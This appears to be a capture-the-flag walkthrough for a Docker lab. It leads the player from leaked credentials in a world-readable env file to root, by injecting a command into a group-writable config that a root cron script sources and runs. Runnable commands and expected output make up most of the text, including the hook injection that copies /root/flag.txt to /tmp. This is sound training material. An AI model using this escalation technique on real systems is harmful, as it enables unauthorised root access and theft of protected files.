# Complete Step-by-Step Walkthrough — Rio's Radio Relay Node

This guide provides a detailed, step-by-step solution to the CTF challenge. Follow along to understand each stage of the exploitation chain.

---

## Prerequisites

1. Ensure the Docker container is running:
   ```bash
   docker compose up --build
   ```

2. Verify SSH access is available on port 2222.

---

## Step 1: Initial Access

**Objective:** Connect to the system as the `tokyo` user.

```bash
ssh tokyo@localhost -p 2222
# Password: tokyo123
```

**Expected output:**
```
Welcome to Ubuntu 22.04 LTS
...
tokyo@<hostname>:~$
```

**What we know:**
- We're logged in as user `tokyo`
- We need to retrieve two files: `/home/rio/mint.key` (KEY) and `/root/flag.txt` (FLAG)

---

## Step 2: Initial Enumeration

**Objective:** Understand the system structure and identify potential attack vectors.

### 2.1 Check current user and permissions

```bash
whoami
id
```

**Expected output:**
```
tokyo
uid=1000(tokyo) gid=1000(tokyo) groups=1000(tokyo)
```

**Analysis:** We're a regular user with no special privileges.

### 2.2 List users on the system

```bash
cat /etc/passwd | grep -E "(tokyo|rio|root)"
```

**Expected output:**
```
root:x:0:0:root:/root:/bin/bash
tokyo:x:1000:1000::/home/tokyo:/bin/bash
rio:x:1001:1001::/home/rio:/bin/bash
```

**Analysis:** Three users exist: `root`, `tokyo` (us), and `rio` (service account). We need to pivot to `rio` first, then escalate to `root`.

### 2.3 Check if we can read the target files

```bash
cat /home/rio/mint.key
cat /root/flag.txt
```

**Expected output:**
```
cat: /home/rio/mint.key: Permission denied
cat: /root/flag.txt: Permission denied
```

**Analysis:** As expected, we cannot read either file. We need to escalate privileges.

### 2.4 Explore the filesystem structure

```bash
ls -la /opt/
ls -la /var/log/
```

**Expected output:**
```
/opt/:
total 16
drwxr-xr-x  4 root root 4096 ...
drwxr-xr-x  3 root root 4096 ...
drwxr-xr-x  3 root root 4096 ...

/opt/relay/:
total 12
-rw-r--r-- 1 root root 123 ... relay.env

/opt/rotation/:
total 16
-rwxr-xr-x 1 root root 456 ... rotate.sh
-rw-rw-r-- 1 root rio   89 ... rotation.env
```

**Analysis:** 
- `/opt/relay/` contains a `relay.env` file (world-readable: `-rw-r--r--`)
- `/opt/rotation/` contains automation scripts
- `rotation.env` is owned by `root:rio` and writable by group `rio` (`-rw-rw-r--`)

### 2.5 Check for cron jobs

```bash
ls -la /etc/cron.d/
cat /etc/cron.d/mint-rotation
```

**Expected output:**
```
-rw-r--r-- 1 root root 45 ... mint-rotation
```

Content of `/etc/cron.d/mint-rotation`:
```
* * * * * root /opt/rotation/rotate.sh >/dev/null 2>&1
```

**Analysis:** A cron job runs `/opt/rotation/rotate.sh` every minute as `root`. This is our potential escalation vector.

---

## Step 3: Stage 1 — Pivot to Rio User

**Objective:** Gain access to the `rio` user account to read the KEY.

### 3.1 Examine the relay configuration

```bash
cat /opt/relay/relay.env
```

**Expected output:**
```
# Rio's Relay Environment (CTF)
# Berlin insisted on "fast onboarding" — so secrets ended up in the wrong place.
# (Intentional for challenge progression)

RIO_USER=rio
RIO_PASS=rio123

RELAY_HOST=127.0.0.1
RELAY_PORT=7711
```

**Analysis:** 🎯 **VULNERABILITY FOUND!** The file contains `RIO_PASS=rio123` — Rio's password is exposed in a world-readable file.

### 3.2 Switch to the rio user

```bash
su rio
# Password: rio123
```

**Expected output:**
```
Password: 
rio@<hostname>:/home/tokyo$
```

**Verification:**
```bash
whoami
id
```

**Expected output:**
```
rio
uid=1001(rio) gid=1001(rio) groups=1001(rio)
```

### 3.3 Retrieve the KEY (First Objective)

```bash
cat /home/rio/mint.key
```

**Expected output:**
```
<KEY_VALUE>
```

**✅ SUCCESS:** We've obtained the KEY! Save this value.

**Note:** We still cannot read the root flag:
```bash
cat /root/flag.txt
```

**Expected output:**
```
cat: /root/flag.txt: Permission denied
```

---

## Step 4: Stage 2 — Root Escalation via Cron

**Objective:** Exploit the cron job to execute commands as root and retrieve the FLAG.

### 4.1 Examine the rotation script

```bash
cat /opt/rotation/rotate.sh
```

**Expected output:**
```bash
#!/bin/bash
# Mint key rotation (runs as root via cron)
set -e

# Intentionally sourced from a file that is writable by rio (challenge design).
source /opt/rotation/rotation.env

LOG=/var/log/relay/rotation.log
mkdir -p /var/log/relay

echo "[rotation] $(date -u +%FT%TZ) :: cycle start" >> "$LOG"
echo "[rotation] mode=$MODE" >> "$LOG"

if [ "$MODE" = "normal" ]; then
  echo "[rotation] normal rotation complete" >> "$LOG"
fi

# Optional post-rotate hook (intentionally dangerous in this CTF)
if [ -n "${POST_ROTATE_HOOK:-}" ]; then
  echo "[rotation] executing post-rotate hook" >> "$LOG"
  /bin/bash -c "$POST_ROTATE_HOOK" >> "$LOG" 2>&1 || true
fi

echo "[rotation] cycle end" >> "$LOG"
```

**Analysis:** 🎯 **CRITICAL VULNERABILITY IDENTIFIED!**
- The script **sources** `/opt/rotation/rotation.env` (line 6)
- It checks for a `POST_ROTATE_HOOK` environment variable (line 19)
- If set, it executes the hook using `/bin/bash -c "$POST_ROTATE_HOOK"` (line 21)
- Since the script runs as `root` via cron, any command in `POST_ROTATE_HOOK` will execute as root
- We (as `rio`) can write to `/opt/rotation/rotation.env` because it's owned by `root:rio` with `0664` permissions

### 4.2 Check current rotation.env content

```bash
cat /opt/rotation/rotation.env
```

**Expected output:**
```
# Mint rotation configuration (CTF)
# Owned by root:rio, writable by rio (intentional).
MODE=normal

# Optional hook executed by rotation script (runs as root if set)
# POST_ROTATE_HOOK=
```

**Analysis:** The `POST_ROTATE_HOOK` is currently commented out/empty. We need to set it.

### 4.3 Verify we can write to rotation.env

```bash
ls -la /opt/rotation/rotation.env
```

**Expected output:**
```
-rw-rw-r-- 1 root rio 89 ... rotation.env
```

**Analysis:** The file is writable by the `rio` group, and we're in that group. ✅

### 4.4 Inject malicious hook to retrieve root flag

We'll add a command to the `POST_ROTATE_HOOK` that copies the root flag to a location we can read.

```bash
echo 'POST_ROTATE_HOOK="cat /root/flag.txt > /tmp/root_flag && chmod 666 /tmp/root_flag"' >> /opt/rotation/rotation.env
```

**Verification:**
```bash
cat /opt/rotation/rotation.env
```

**Expected output:**
```
# Mint rotation configuration (CTF)
# Owned by root:rio, writable by rio (intentional).
MODE=normal

# Optional hook executed by rotation script (runs as root if set)
# POST_ROTATE_HOOK=
POST_ROTATE_HOOK="cat /root/flag.txt > /tmp/root_flag && chmod 666 /tmp/root_flag"
```

**Explanation:**
- We're appending a line that sets `POST_ROTATE_HOOK` to a command
- The command reads `/root/flag.txt` and writes it to `/tmp/root_flag`
- It also makes the file world-readable (`chmod 666`) so we can read it as `rio`

### 4.5 Wait for cron execution

The cron job runs every minute. We need to wait for the next execution (maximum 60 seconds).

**Option A: Monitor the rotation log**
```bash
tail -f /var/log/relay/rotation.log
```

**Option B: Check the log periodically**
```bash
# Wait a moment, then check
sleep 65
cat /var/log/relay/rotation.log
```

**Expected log output:**
```
[rotation] 2024-XX-XXTXX:XX:XXZ :: cycle start
[rotation] mode=normal
[rotation] normal rotation complete
[rotation] executing post-rotate hook
[rotation] cycle end
```

**Analysis:** The log shows "executing post-rotate hook", which means our command ran as root!

### 4.6 Retrieve the FLAG (Second Objective)

```bash
cat /tmp/root_flag
```

**Expected output:**
```
<FLAG_VALUE>
```

**✅ SUCCESS:** We've obtained the FLAG!

---

## Step 5: Verification and Cleanup

### 5.1 Verify both artifacts

```bash
echo "KEY:"
cat /home/rio/mint.key
echo ""
echo "FLAG:"
cat /tmp/root_flag
```

### 5.2 (Optional) Clean up the hook

If you want to remove the injected hook (optional, for clean state):

```bash
# Remove the last line we added
head -n 6 /opt/rotation/rotation.env > /tmp/rotation.env.clean
mv /tmp/rotation.env.clean /opt/rotation/rotation.env
```

---

## Summary of Exploitation Chain

### Attack Flow:
1. **Initial Access:** SSH as `tokyo` (given credentials)
2. **Enumeration:** Discovered `/opt/relay/relay.env` with world-readable permissions
3. **Stage 1 - Pivot:** Extracted `RIO_PASS=rio123` from `relay.env` → switched to `rio` user → retrieved KEY
4. **Stage 2 - Escalation:** 
   - Discovered cron job running `/opt/rotation/rotate.sh` as root
   - Identified that script sources `/opt/rotation/rotation.env` (writable by `rio`)
   - Injected command via `POST_ROTATE_HOOK` environment variable
   - Cron executed our command as root → retrieved FLAG

### Vulnerabilities Exploited:
1. **Information Disclosure:** `/opt/relay/relay.env` with world-readable permissions (0644) exposed Rio's password
2. **Insecure File Permissions:** `/opt/rotation/rotation.env` writable by non-root user (`root:rio` with 0664)
3. **Command Injection:** `POST_ROTATE_HOOK` executed via `bash -c` without sanitization
4. **Privilege Escalation:** Root cron job sourcing user-controlled configuration file

### Key Learning Points:
- Always check file permissions on configuration files
- Environment variables sourced from writable files can lead to command injection
- Cron jobs running as root should never source files writable by non-root users
- Multi-stage attacks: pivot through intermediate accounts to reach final target

---

## Submission

Submit both values:
- **KEY:** `<value from /home/rio/mint.key>`
- **FLAG:** `<value from /root/flag.txt>`

---

## Troubleshooting

### Cron not executing?
- Check if cron is running: `ps aux | grep cron`
- Verify cron job exists: `cat /etc/cron.d/mint-rotation`
- Check cron logs: `grep CRON /var/log/syslog` (if available)

### Hook not executing?
- Verify the syntax in `rotation.env`: `cat /opt/rotation/rotation.env`
- Check rotation log for errors: `cat /var/log/relay/rotation.log`
- Ensure the hook variable is not commented out (should start with `POST_ROTATE_HOOK=` not `#POST_ROTATE_HOOK=`)

### Permission denied on rotation.env?
- Verify you're the `rio` user: `whoami`
- Check file permissions: `ls -la /opt/rotation/rotation.env`
- Should show `-rw-rw-r-- 1 root rio`

---

**End of Walkthrough**

